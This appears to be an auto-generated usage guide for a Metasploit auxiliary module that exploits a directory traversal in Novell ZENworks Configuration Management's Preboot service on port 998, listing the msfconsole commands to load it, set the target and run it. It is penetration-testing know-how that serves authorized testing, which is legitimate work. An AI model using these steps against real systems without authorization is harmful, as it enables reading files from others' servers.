**The description of current metasploit exploit**
This module exploits a directory traversal in the ZENworks Configuration Management.          The vulnerability exists in the Preboot service and can be triggered by sending a specially          crafted PROXY_CMD_FTP_FILE (opcode 0x21) packet to the 998/TCP port. This module has been          successfully tested on Novell ZENworks Configuration Management 10 SP2 and SP3 over Windows.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/misc/zenworks_preboot_fileaccess
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 998 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.